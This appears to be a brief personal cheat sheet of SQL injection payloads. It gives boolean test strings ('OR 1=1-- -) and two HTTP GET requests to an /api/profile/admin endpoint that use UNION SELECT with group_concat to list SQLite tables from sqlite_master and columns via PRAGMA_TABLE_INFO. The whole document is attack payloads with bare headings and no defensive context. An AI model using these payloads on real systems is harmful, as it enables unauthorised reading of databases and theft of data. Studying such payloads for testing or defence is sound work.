


### Testing for SQL Injection
```sql
'OR 1=1-- -
'AND 1=1-- -
```
### List Tables SQLite
GET /api/profile/admin'UNION SELECT 1,2,3,4,5,6,group_concat(tbl_name) FROM sqlite_master 

### LIST Rows on Table SQLite
GET /api/profile/admin'UNION SELECT 1,2,3,4,5,6, group_concat(name) FROM PRAGMA_TABLE_INFO 